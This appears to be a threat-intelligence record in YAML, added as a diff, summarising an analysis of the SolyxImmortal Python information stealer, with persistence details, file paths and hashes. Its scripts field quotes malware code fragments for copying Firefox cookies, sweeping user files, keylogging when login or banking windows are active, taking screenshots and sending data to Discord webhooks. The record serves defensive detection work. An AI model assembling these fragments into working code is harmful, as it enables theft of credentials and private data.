@@ -1,0 +1,59 @@
+title: SolyxImmortal - Analysis of a Python-based Information Stealer
+description: SolyxImmortal is a Python-based information stealer that targets credentials
+  from Chromium-based browsers, Firefox cookies, sensitive files, screenshots, and
+  keystrokes, exfiltrating data via Discord webhooks. The malware establishes persistence
+  via a registry Run key and copies itself to the %APPDATA%\WindowsGraphics folder.
+attribution: ''
+malware_families:
+- SolyxImmortal
+cves: []
+ttps:
+  processes:
+  - python.exe
+  command_lines: []
+  powershell: []
+  scripts:
+  - 'for prof in os.listdir(ff_base): c_db = os.path.join(ff_base, prof, "cookies.sqlite")'
+  - shutil.copy2(c_db, os.path.join(self.zip_folder, f"ff_cookies_{prof}.sqlite"))
+  - 'for root, _, files in os.walk(self.user_home): if any(x in root for x in ("AppData",
+    "Windows", "Program Files", "Temp")): continue'
+  - shutil.copy2(os.path.join(root, file), os.path.join(self.zip_folder, file))
+  - 'def _on_press(self, key): k = str(key).replace("''", "") if k == "Key.enter":
+    self.log_buffer += "\n"'
+  - critical_keywords = ("login", "giris", "oturum ac", "sign in", "bank", "steam",
+    "gmail", "wallet", "parola")
+  - 'win = gui.getActiveWindow() if win and win.title: title = win.title.lower() if
+    any(kw in title for kw in critical_keywords): self.is_critical_typing = True'
+  - 'if time.time() - last_rout > 120: pyautogui.screenshot(p) self._send(IMG_WEBHOOK,
+    "[] **Rutin SS**", p)'
+  - 'def _send(self, url, msg, file=None, mention=False): content = f"<@{USER_ID}>
+    {msg}" if mention else msg'
+  registry_keys:
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+  image_loads: []
+  network_connections: []
+  file_activity:
+  - '%APPDATA%\WindowsGraphics'
+  - '%localappdata%\Mozilla\Firefox\Profiles'
+  - sifreler.txt
+  - alert.png
+  - cookies.sqlite
+  - Solyx_Final_Data.zip
+  - routine.png
+  persistence:
+  - Registry Run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run entry named
+    WindowsGfxDriver pointing to %APPDATA%\WindowsGraphics
+  - Malware copies itself to %APPDATA%\WindowsGraphics before adding Run key entry
+  process_relations: []
+iocs:
+  hashes:
+  - 5a1b440861ef652cc207158e7e129f0b3a22ed5ef5d2ea5968e1d9eff33017bc
+  - 81c66c043982cfee9e60ae94203f4336da0b50c0
+  - 2690f7c685784fff006fe451fa3b154c
+  ip_addresses: []
+  domains: []
+  urls: []
+authors: []
+reference: https://blog.pulsedive.com/solyximmortal-analysis-of-a-python-based-information-stealer/
+date_of_publication: May 27, 2026
+file_creation_date: June 01, 2026
